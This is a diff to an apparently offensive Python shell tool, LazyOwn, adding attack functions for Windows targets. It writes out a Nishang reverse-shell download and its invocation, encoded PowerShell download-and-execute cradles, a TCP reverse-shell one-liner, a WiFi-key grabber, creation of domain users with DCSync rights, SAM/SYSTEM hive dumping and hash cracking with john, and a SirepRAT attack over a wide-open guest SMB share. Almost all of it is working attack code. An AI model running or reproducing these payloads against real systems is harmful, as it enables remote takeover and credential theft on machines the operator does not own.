@@ -4035,6 +4035,7 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
         path = os.getcwd()
+        sessions = f"{path}/sessions"
         if not lport or not lhost:
             print_msg(
                 f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
@@ -4051,6 +4052,13 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"curl -o /tmp/revshell.sh http://{lhost}/revshell.sh && /bin/bash /tmp/revshell.sh")
         file_rev = f"{path}/sessions/win/payload.ps1"
         file_rev_ses = f"{path}/sessions/payload.ps1"
+        wget = f"wget -P {sessions} https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
+        print_msg(wget)
+        os.system(wget)
+        edit = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> {sessions}/Invoke-PowerShellTcp.ps1"
+        print_msg(edit)
+        os.system(edit)
+        
         with open(file_rev, 'r') as f:
             rev_content = f.read()
 
@@ -4071,11 +4079,16 @@ class LazyOwnShell(cmd2.Cmd):
         
         payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
         print_msg(payload)
+        payload2 = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1')".replace("{lhost}",lhost)
+        print_msg(payload2)
         utf16_command = payload.encode('utf-16le')
         base64_command = base64.b64encode(utf16_command).decode('utf-8')
         payload = base64_command
-        ino_file = "digispark_win.ino"
-        print_msg(f"Generated Windows payload: powershell /enc  {payload}")        
+        utf16_command2 = payload2.encode('utf-16le')
+        base64_command2 = base64.b64encode(utf16_command2).decode('utf-8')
+        payload2 = base64_command2
+        print_msg(f"Generated Windows payload: powershell /enc  {payload}")
+        print_msg(f"Generated Windows payload: powershell /enc  {payload2}")
         return
 
     def do_createwinrevshell(self, line):
@@ -5267,7 +5280,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("locate .fetchmailrc files", "locate '.fetchmailrc'"),
             ("locate backup files", "locate backup"),
             ("locate dump files", "locate dump"),
-            ("locate priv files", "locate priv"),
+            ("locate priv iot files", "powershell -c \"$credential = import-clixml -path C:\\Data\\Users\\app\\iot-admin.xml;$credential.GetNetworkCredential().password\""),
             ("lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
             ("WIN Rrev Shell", '$sm=(New-Object Net.Sockets.TCPClient("{lhost}",{lport})).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'.replace('{lhost}',lhost).replace('{lport}',str(lport))),
             ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
@@ -5276,7 +5289,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN CREATE USER 2", "net user lazyown abc123! /add /domain ; net group \"Exchange Windows Permissions\" lazyown /add ; net localgroup \"Remote Management Users\" lazyown /add"),
             ("WIN Add-ObjectACL",f"$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\lazyown', $pass) ; Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC={name}, DC={ext}\" -PrincipalIdentity lazyown -Rights DCSync"),
             ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
-            ("WIN List Directory", "dir"),
+            ("WIN equivalent to whoami", "echo %USERPROFILE%"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
             ("WIN Find *config*.php in current dir", "dir /s /w /b *config*.php"),
             ("WIN Show active connections", "netstat -an"),
@@ -11805,16 +11818,25 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Gathering credentials for secretsdump.py execution...")
         url = self.params["url"]
         rhost = self.params["rhost"]
+        wordlist = self.params["wordlist"]
         dominio = get_domain(url)
 
         path_cred = "sessions/credentials.txt"        
        
         if not os.path.exists(path_cred):
-            if os.path.exists("sessions/SYSTEM"):
-                command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL"
-                print_msg(f"Executing command: {command}")
 
+            if os.path.exists("sessions/SYSTEM"):
+                hashs = "sessions/hashs.txt"
+                cleanned = "sessions/hashs_cleaned.txt"
+                command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL -outputfile {hashs}"
+                print_msg(f"Executing command: {command}")
                 os.system(command)
+                os.system(f"nano {hashs}.sam")
+                os.system(f"cat {hashs}.sam")
+                command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
+                print_msg(command)
+                os.system(command)
+                os.system(f"sudo john {hashs}.sam --show")
                 return
             else:
                 print_error("You need credentials.txt or SAM and SYSTEM files")
@@ -15267,7 +15289,7 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
         sireprat_repo = "https://github.com/SafeBreach-Labs/SirepRAT.git"
         sireprat_dir = os.path.join(os.getcwd(), "external/.exploit/SirepRAT")
-        
+        sessions = os.path.join(os.getcwd(), "sessions")
         if not os.path.exists(sireprat_dir):
             print_msg("Cloning SirepRAT repository...")
             os.system(f"git clone {sireprat_repo} {sireprat_dir}")
@@ -15276,8 +15298,31 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_msg("SirepRAT already installed, skipping setup.")
         
+        choice = input("    [!] do you wanna config smb service ? its necesary to perform the attack. (y/n): ") or 'n'
+        if choice == "y":
+            smb_file = "/etc/samba/smb.conf"
+            smb_conf = """
+            [Public]
+            path = /tmp/Public
+            writable = yes
+            guest ok = yes
+            guest only = yes
+            create mode = 0777
+            directory mode = 077
+            force user = nobody
+            """.replace("            ","")
+            copy2clip(smb_conf)
+            command = "mkdir /tmp/Public && chmod 777 /tmp/Public"
+            print_msg(command)
+            os.system(command)
+            print_msg(f"opening sudo nano {smb_file} -l use Shift + Ctrl + V to paste smb.conf content.")
+            input("Press enter to continue. ")
+            os.system(f"sudo nano {smb_file} -l")
+            os.system("service smbd restart")
+
         attack_list = [
             "GetSystemInformationFromDevice",
+            "GetFileInformationFromDevice --remote_path \"C:\\Windows\\System32\\ntoskrnl.exe\"",
             "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c echo {{userprofile}}\"",
             "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SYSTEM C:\\SYSTEM\"",
             "LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c reg save HKLM\\SAM C:\\SAM\"",
@@ -15301,6 +15346,9 @@ class LazyOwnShell(cmd2.Cmd):
                         os.system(sireprat_command)
                         print_msg(f"Sleeping 1 sec to continue to the next attack...")
                         time.sleep(1)
+                    print_msg(f"cp /tmp/Public/* {sessions}")    
+                    os.system(f"cp /tmp/Public/* {sessions}")
+
                 elif 1 <= selected_attack <= len(attack_list):
                     line = attack_list[selected_attack - 1]
                 else:
@@ -15319,6 +15367,8 @@ class LazyOwnShell(cmd2.Cmd):
                 os.system(sireprat_command)
                 print_msg(f"Sleeping 1 sec to continue to the next attack...")
                 time.sleep(1)
+            print_msg(f"cp /tmp/Public/* {sessions}")    
+            os.system(f"cp /tmp/Public/* {sessions}")                
             return
         
         else:
@@ -15552,6 +15602,37 @@ class LazyOwnShell(cmd2.Cmd):
         os.system(command)
         return
 
+    def do_samdump2(self, line):
+        """Run samdump2 with the SAM and SYSTEM file
+
+        :param line: This parameter is not used in the function but can be reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `samdump2`, use the following command:
+
+            samdump2 sessions/SYSTEM sessions/SAM
+
+        This function prompts the user for domain, username, password, and IP address.
+        """
+        rhost = self.params["rhost"]
+        if not is_binary_present("samdump2"):
+            print_warn("samdump2 is not installed. Installing dependencies.")
+            os.system("apt-get install samdump2 -y")
+
+        
+        if os.path.exists("sessions/SYSTEM"):
+            output_file =  f"sessions/samdump_{rhost}.txt"
+            command = f"samdump2 sessions/SYSTEM sessions/SAM -o {output_file}"
+            print_msg(f"Executing command: {command}")
+            os.system(command)
+            os.system(f"cat {output_file}")
+            return
+        else:
+            print_error("You need credentials.txt or SAM and SYSTEM files")
+    
+        return
 
 
 if __name__ == "__main__":
